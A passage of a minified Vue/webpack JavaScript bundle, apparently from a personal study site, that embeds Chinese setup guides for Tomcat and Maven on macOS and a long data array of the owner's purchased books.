33)\n这个序列应该出现在不移动光标的字符序列（如颜色转义序列）之前。它使bash能够正确计算自动换行。\n这个序列应该出现在非打印字符序列之后。\n知道了全部的转义序列，就可以对自己的终端提示符进行定制了。\n\n\n    ")])])}],mn={},dn=mn,gn=Object(u["a"])(dn,pn,un,!1,null,"db8584be",null),bn=gn.exports,vn=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},hn=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h4",[n._v("Mac电脑Tomcat下载及安装(详细)")]),t("pre",[n._v("           1.打开Apache Tomcat官网,选择你需要的版本进行下载:\n地址http://tomcat.apache.org/download-70.cgi\n\n2.解压apache-tomcat-7.0.82文件,最好把他放入/Library(资源库中)\nmac寻找library资源库\n\n(1).点击finder--\x3e用户--\x3e你电脑的名字--\x3e资源库(有的也叫/Library)\n\n\n\n(2).有些苹果将library目录隐藏起来了，要进入那个目录，需要用到一定的技巧。 \n\n打开Finder，按下shift+command+g，输入“~/Library”（输入引号里面的），再按回车就到了。\n\n3.配置Tomcat\n\n(1).对目录进行权限设置：\n\n打开终端输入  sudo chmod 755 Library/tomcat/bin/*.sh  回车，设置文件的读写执行权限；(这里需要输入管理员密码)\n\n为了方便使用把这里把解压后的apache-tomcat-7.0.82重新命名为tomcat.\n\nsudo chmod 755 (你Tomcat解压的位置,可以直接拖拽放入)/bin/*.sh\n\n注释:sudo通常为系统超级管理员755 代表用户对该文件拥有读，写，执行的权限，\n同组其他人员拥有执行和读的权限，没有写的权限，其他用户的权限和同组人员权限一样。777代表，user,group ,others ,都有读写和可执行权限。\n\n(2).启动Tomcat      \n\n启动方法一:在终端中输入 sudo sh startup.sh\n\n若出现如下提示则表示安装并运行成功： \n\n\n启动方法二:在Library/tomcat/bin中找到startup.sh文件,把文件拖入到终端中回车启动\n\n\n4.验证Tomcat是否启动\n\n打开你的safari,然后在网址输入框输入http://localhost:8080/回车\n\n如果能正常打开tomcat首页，说明tomcat 配置启动成功:\n--------------------- \n\n       ")])])}],Sn={},yn=Sn,fn=Object(u["a"])(yn,vn,hn,!1,null,"bc6d13e4",null),_n=fn.exports,xn=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},wn=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("pre",[n._v('        Mac安装、配置Maven\n2017年09月16日 21:15:52 东陆之滇 阅读数：22536\n 版权声明：欢迎转载，但是请附上原文链接! https://blog.csdn.net/zixiao217/article/details/78006599\nMac下安装maven步骤如下：\n下载maven， http://maven.apache.org/download.cgi 下载 \n\n\n我们选择binary zip archive 的类型 。\n解压maven 解压下载好的maven’，将目录丢到终端命令去获取文件路径。设置path： \nvi ~/.bash_profile \n添加maven的路径，将下载好的maven资源引入path 中：\nexport M2_HOME=/Users/byronyy/Documents/zixiao217/jobsoftwares/apache-maven-3.5.0\nexport PATH=$PATH:$M2_HOME/bin\n1\n2\n使path设置生效 \n设置path后，使用以下命令使之生效： \nsource ~/.bash_profile\n查看maven配置是否生效 \n使用 man -v 命令查看mvn命令是否ok\n mvn -v\nApache Maven 3.5.0 (ff8f5e7444045639af65f6095c62210b5713f426; 2017-04-04T03:39:06+08:00)\nMaven home: /Users/byronyy/Documents/zixiao217/jobsoftwares/apache-maven-3.5.0\nJava version: 1.8.0_144, vendor: Oracle Corporation\nJava home: /Library/Java/JavaVirtualMachines/jdk1.8.0_144.jdk/Contents/Home/jre\nDefault locale: zh_CN, platform encoding: UTF-8\nOS name: "mac os x", version: "10.12.6", arch: "x86_64", family: "mac"\n1\n2\n3\n4\n5\n6\n7\n我们看到maven安装并设置ok了。接下来可以使用maven构建应用了。\n')])])}],En={},Tn=En,kn=Object(u["a"])(Tn,xn,wn,!1,null,"f6c9236a",null),Cn=kn.exports,jn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Mn=[],Rn={},Ln=Rn,On=Object(u["a"])(Ln,jn,Mn,!1,null,"4942b3d4",null),An=On.exports,In=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Dn=[],Pn={},Nn=Pn,qn=Object(u["a"])(Nn,In,Dn,!1,null,"1f4e9b15",null),Hn=qn.exports,Bn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Fn=[],Un={},Jn=Un,zn=Object(u["a"])(Jn,Bn,Fn,!1,null,"154afb54",null),Wn=zn.exports,$n=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Gn=[],Vn={},Qn=Vn,Kn=Object(u["a"])(Qn,$n,Gn,!1,null,"69332cd2",null),Xn=Kn.exports,Yn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Zn=[],nr={},rr=nr,tr=Object(u["a"])(rr,Yn,Zn,!1,null,"bd1b5e50",null),er=tr.exports,ar={mixins:[tn["a"]],components:{m1:bn,m2:_n,m3:Cn,m4:An,m5:Hn,m6:Wn,m7:Xn,m8:er},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"基本",value:"m1"},{label:"基本",value:"m2"},{label:"基本",value:"m3"},{label:"基本",value:"m4"},{label:"基本",value:"m5"},{label:"基本",value:"m6"},{label:"基本",value:"m7"},{label:"基本",value:"m8"}]}}},ir=ar,sr=Object(u["a"])(ir,ln,cn,!1,null,"bc1b338e",null),or=sr.exports,lr={mixins:[tn["a"]],components:{win:on,mac:or},data:function(){return{tab_level:1,tab:"win",tabs:[{label:"win",value:"win"},{label:"mac",value:"mac"}]}}},cr=lr,pr=Object(u["a"])(cr,e,a,!1,null,"0906d96d",null);r["default"]=pr.exports},"221b":function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},a=[],i=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",n._l(n.books,(function(r,e){return t("div",{key:e},[t("a",{attrs:{href:n.$utils.compute_book_src(r),target:"_blank",rel:"noopener noreferrer"}},[n._v(n._s(n.$utils.compute_book_name(r)))])])})),0)},s=[],o={data:function(){return{books:["web/jinnian-web-2020-01-13.xmind","web/阮一峰JavaScript基础总结.xmind","web/React 全家桶.xmind"]}}},l=o,c=t("2877"),p=Object(c["a"])(l,i,s,!1,null,"21f59d7d",null),u=p.exports,m=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{staticClass:"q-pa-md"},[t("div",{staticClass:"q-mb-md  "},[n._v("总书本 数量："+n._s(n.book_num)+"    ")]),t("div",{staticClass:"q-mb-md  "},[n._v("总书本 项目数：   "+n._s(n.book_to_buy.length))]),t("q-markup-table",[t("thead",[t("tr",{staticClass:"text-left"},[t("th",{},[n._v("分类")]),t("th",{},[n._v("语种")]),t("th",{},[n._v("名字")]),t("th",{},[n._v("是否套装")]),t("th",{},[n._v("本数")]),t("th",{},[n._v("是否已购买")]),t("th",{},[n._v("购买日期")])])]),t("tbody",n._l(n.book_to_buy,(function(r,e){return t("tr",{key:e},[t("td",{},[n._v(n._s(r.type))]),t("td",{},[n._v(n._s(n.compute_lang_str(r.lang)))]),t("td",{},[n._v(" "+n._s(r.name))]),t("td",{},[n._v(" "+n._s(r.series?"是":"否"))]),t("td",{},[n._v(" "+n._s(r.num))]),t("td",{},[n._v(" "+n._s(1==r.buy?"是":"否"))]),t("td",{},[n._v(" "+n._s(r.date))])])})),0)])],1)},d=[],g=(t("d81d"),t("99af"),t("ac1f"),t("1276"),t("498a"),{data:function(){return{bookshelf_prefix:"https://jinnianwushuang.github.io/jinnian-space/"}},methods:{compute_book_path:function(n){return"".concat(this.bookshelf_prefix).concat(n.trim())},compute_book_name:function(n){var r=n.split("/");return r[r.length-1]}}}),b=[{type:"科普",lang:"zh",name:"中国国家地理百科全书",series:!0,num:10,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"环球国家地理百科全书",series:!0,num:10,buy:1,date:"2020-10-23"},{type:"小说",lang:"en",name:"哈利波特(1-7)",series:!0,num:7,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"BBC科普--地球-行星的力量",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"BBC科普--海洋-深水探秘",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"BBC科普--生命-非常的世界",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"BBC宇宙科普--宇宙起源",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"BBC宇宙科普--宇宙之光",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"BBC宇宙科普--宇宙星辰",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"BBC--4K海洋百科 蓝色星球二",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"BBC--飞跃地球",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"BBC--地球脉动",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"BBC--地球脉动2 -奇迹世界",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"BBC--冰冻星球",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"BBC--生命的故事",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"BBC--俯瞰地球",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"天文摄影指南",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"DK博物大百科",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经典科普",lang:"zh",name:"世界科普10本-几何原本",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经典科普",lang:"zh",name:"世界科普10本-物种起源",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经典科普",lang:"zh",name:"世界科普10本-自然史",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经典科普",lang:"zh",name:"世界科普10本-相对论",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经典科普",lang:"zh",name:"世界科普10本-基因论",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经典科普",lang:"zh",name:"世界科普10本-人在自然界的位置",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经典科普",lang:"zh",name:"世界科普10本-天体运行论",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经典科普",lang:"zh",name:"世界科普10本-自然哲学之数学原理",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经典科普",lang:"zh",name:"世界科普10本-通俗天文学",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经典科普",lang:"zh",name:"世界科普10本-海陆的起源",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"地球与太空--太空传奇",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"地球与太空--行星全书",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"地球与太空--星座全书",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"地球与太空--从粒子到宇宙",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"地球与太空--地球与太空",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"太空--纸上天文馆",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"简史--今日简史",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"简史--万物简史",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"简史--时间简史",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"简史--未来简史",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"简史--人类简史",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"科普",lang:"zh",name:"简史--宇宙简史",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"人生原则",lang:"zh",name:"原则--原则",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"人生原则",lang:"zh",name:"原则--阿里巴巴人力资源管理",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"人生原则",lang:"zh",name:"原则--阿米巴经管理",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"人生原则",lang:"zh",name:"原则--华为人力资源管理",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"人生原则",lang:"zh",name:"原则--稻盛和夫给年轻人的忠告",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"人生原则",lang:"zh",name:"原则--格局",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"人生原则",lang:"zh",name:"原则--见识",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"人生原则",lang:"zh",name:"原则--情商",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"人生原则",lang:"zh",name:"原则--眼界",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"人生原则",lang:"zh",name:"原则--策略",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"思维训练",lang:"zh",name:"思维训练--思维导图",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"思维训练",lang:"zh",name:"思维训练--思维风暴",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"思维训练",lang:"zh",name:"思维训练--最强大脑",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"思维训练",lang:"zh",name:"思维训练--高效记忆法",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"思维训练",lang:"zh",name:"思维训练--超级记忆术",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"思维训练",lang:"zh",name:"思维训练--锻炼思维的逻辑游戏",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"思维训练",lang:"zh",name:"思维训练--逆转思维",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"思维训练",lang:"zh",name:"思维训练--认知天性",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"思维训练",lang:"zh",name:"思维训练--挑战大脑的侦探推理游戏",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"思维训练",lang:"zh",name:"思维训练--超级学习力",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"思维训练",lang:"zh",name:"思维训练--自控力",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"戴尔卡耐基心理学",lang:"zh",name:"戴尔卡耐基--人性的弱点",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"戴尔卡耐基心理学",lang:"zh",name:"戴尔卡耐基--人性的突破",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"戴尔卡耐基心理学",lang:"zh",name:"戴尔卡耐基--卡耐基传",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"戴尔卡耐基心理学",lang:"zh",name:"戴尔卡耐基--语言的艺术",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"戴尔卡耐基心理学",lang:"zh",name:"戴尔卡耐基--人生箴言",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"戴尔卡耐基心理学",lang:"zh",name:"戴尔卡耐基--林肯外传",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"创业心理学",lang:"zh",name:"创业心理学--低风险创业",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"创业心理学",lang:"zh",name:"创业心理学--塔木德",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"创业心理学",lang:"zh",name:"创业心理学--羊皮卷",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"创业心理学",lang:"zh",name:"创业心理学--领导力法则",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"创业心理学",lang:"zh",name:"创业心理学--狼道",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"创业心理学",lang:"zh",name:"创业心理学--玩的就是心计",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"创业心理学",lang:"zh",name:"创业心理学--微表情心理学",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"创业心理学",lang:"zh",name:"创业心理学--沃顿谈判课",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"创业心理学",lang:"zh",name:"创业心理学--沃尔森法则",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"创业心理学",lang:"zh",name:"创业心理学--吉德林法则",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"华为企业管理",lang:"zh",name:"华为任正非--华为方法",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"华为企业管理",lang:"zh",name:"华为任正非--华为创新管理",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"华为企业管理",lang:"zh",name:"华为任正非--华为管理哲学",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"华为企业管理",lang:"zh",name:"华为任正非--华为离职江湖",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"华为企业管理",lang:"zh",name:"华为任正非--神坛在坐华为往右",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"华为企业管理",lang:"zh",name:"华为任正非--华为的冬天",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"华为企业管理",lang:"zh",name:"华为任正非--以奋斗着为本",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"华为企业管理",lang:"zh",name:"华为任正非--以客户为中心",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"华为企业管理",lang:"zh",name:"华为任正非--天道酬勤",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"华为企业管理",lang:"zh",name:"华为任正非--致新员工书",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"华为企业管理",lang:"zh",name:"华为任正非--华为之秘",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"华为企业管理",lang:"zh",name:"华为任正非--任正非",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"华为企业管理",lang:"zh",name:"华为任正非--世界极客任正非",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"管理",lang:"zh",name:"管理--不懂带团队，你就自己累",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"管理",lang:"zh",name:"管理--管理三要：能识人会用人懂管理",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"管理",lang:"zh",name:"管理--领导力法则",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"管理",lang:"zh",name:"管理--如何说，员工才会听",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"管理",lang:"zh",name:"管理--高情商管理，三分管人，七分做人",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经济学",lang:"zh",name:"经济学--博弈论",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经济学",lang:"zh",name:"经济学--经济常识一本全",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经济学",lang:"zh",name:"经济学--经济学（越简单越实用）",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经济学",lang:"zh",name:"经济学--你的第一本金融学",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经济学",lang:"zh",name:"经济学--北大经济课",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"经济学",lang:"zh",name:"经济学--国富论",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"投资管理",lang:"zh",name:"生活和工作原则--瑞达利著",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"投资管理",lang:"zh",name:"债务危机--瑞达利著",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"北大金书",lang:"zh",name:"人生金书系列--北大经济课",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"北大金书",lang:"zh",name:"人生金书系列--北大人文课",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"北大金书",lang:"zh",name:"人生金书系列--北大投资课",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"北大金书",lang:"zh",name:"人生金书系列--北大金融课",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"北大金书",lang:"zh",name:"人生金书系列--经济学一本通",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"北大金书",lang:"zh",name:"人生金书系列--北大口才课",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"北大金书",lang:"zh",name:"人生金书系列--北大国学课",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"北大金书",lang:"zh",name:"人生金书系列--北大心理课",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"北大金书",lang:"zh",name:"人生金书系列--北大管理课",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"北大金书",lang:"zh",name:"人生金书系列--北大哲学课",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"哈弗管理",lang:"zh",name:"哈弗管理全集--管理者手册",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"哈弗管理",lang:"zh",name:"哈弗管理全集--企业培训管理",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"哈弗管理",lang:"zh",name:"哈弗管理全集--生产与品质管理",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"哈弗管理",lang:"zh",name:"哈弗管理全集--办公行政管理",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"哈弗管理",lang:"zh",name:"哈弗管理全集--市场营销管理",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"哈弗管理",lang:"zh",name:"哈弗管理全集--人力资源管理",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"哈弗管理",lang:"zh",name:"哈弗管理全集--财务管理",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"哈弗管理",lang:"zh",name:"哈弗管理全集--投资管理",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"财经",lang:"zh",name:"财经人物传记--巴菲特",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"财经",lang:"zh",name:"财经人物传记--李嘉诚",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"财经",lang:"zh",name:"财经人物传记--乔布斯",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"财经",lang:"zh",name:"财经人物传记--德鲁克说管理",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"财经",lang:"zh",name:"财经人物传记--科特勒营销全书",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"商界",lang:"zh",name:"商界40年--弄潮儿",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"商界",lang:"zh",name:"商界40年--先行者",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"商界",lang:"zh",name:"商界40年--梦想家",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"商界",lang:"zh",name:"商界40年--逐鹿人",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"营销-淘宝",lang:"zh",name:"营销淘宝--淘宝天猫开店一本通",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"营销-淘宝",lang:"zh",name:"营销淘宝--淘宝天猫SEO",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"营销-淘宝",lang:"zh",name:"营销淘宝--社群营销",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"营销-淘宝",lang:"zh",name:"营销淘宝--从零开始学运营",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"营销-淘宝",lang:"zh",name:"营销淘宝--营销策划食用技巧",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"营销-淘宝",lang:"zh",name:"营销淘宝--别输在不懂营销上",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"处世智慧",lang:"zh",name:"处世智慧--鬼谷子",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"处世智慧",lang:"zh",name:"处世智慧--羊皮卷",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"处世智慧",lang:"zh",name:"处世智慧--墨菲定律",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"处世智慧",lang:"zh",name:"处世智慧--人性的弱点",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"处世智慧",lang:"zh",name:"处世智慧--狼道",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"处世智慧",lang:"zh",name:"处世智慧--口才三绝",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"处世智慧",lang:"zh",name:"处世智慧--为人三会",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"处世智慧",lang:"zh",name:"处世智慧--修心三不",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"处世智慧",lang:"zh",name:"处世智慧--格局",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"处世智慧",lang:"zh",name:"处世智慧--高情商办事就让人舒服",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"处世智慧",lang:"zh",name:"处世智慧--人际关系心理学",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"处世智慧",lang:"zh",name:"处世智慧--跟任何人都能聊得来",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"计算机",lang:"en",name:"计算机--计算机程序设计艺术-基本算法",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"计算机",lang:"en",name:"计算机--计算机程序设计艺术-半数值算法",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"计算机",lang:"en",name:"计算机--计算机程序设计艺术-排序与查找",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"计算机",lang:"en",name:"计算机--计算机程序设计艺术-组合算法",series:!0,num:1,buy:1,date:"2020-10-23"},{type:"计算机",lang:"zh",name:"计算机--计算机科学技术百科全书",series:!1,num:1,buy:1,date:"2020-10-23"},{type:"国学",lang:"zh",name:"国学---资治通鉴",series:!0,num:16,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---二十四史",series:!0,num:24,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---孙子兵法与三十六计",series:!0,num:6,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---四书五经",series:!0,num:6,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---红楼梦",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---西游记",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---水浒传",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---三国演义",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---唐诗鉴赏辞典",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---宋词鉴赏辞典",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---元曲鉴赏辞典",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---历代辞赋鉴赏辞典",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---诗经楚辞鉴赏辞典",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---先秦两汉魏晋南北朝诗歌鉴赏辞典",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---元明清诗歌鉴赏辞典",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"国学",lang:"zh",name:"国学---古代诗词鉴赏辞典",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---林清玄散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---老舍散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---宗璞散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---鲁迅散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---余光中散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---朱自清散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---余秋雨散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---张晓风散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---粱衡散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---冯骥才散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---巴金散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---毕淑敏散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---冰心散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---丁立梅散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---史铁生散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---汪曾祺散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---沈从文散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"名家散文",lang:"zh",name:"散文---贾平凹散文精选",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"历史",lang:"zh",name:"历史---世界文明孤独史-人类精神的伟大起源",series:!0,num:2,buy:1,date:"2020-10-24"},{type:"历史",lang:"zh",name:"历史---看得见的世界史---24册",series:!0,num:24,buy:1,date:"2020-10-24"},{type:"传记",lang:"zh",name:"毛泽东传",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"传记",lang:"zh",name:"周恩来传",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"传记",lang:"zh",name:"邓小平传",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"传记",lang:"zh",name:"蒋介石传",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"画传",lang:"zh",name:"故宫院长说故宫",series:!1,num:1,buy:1,date:"2020-10-24"},{type:"画传",lang:"zh"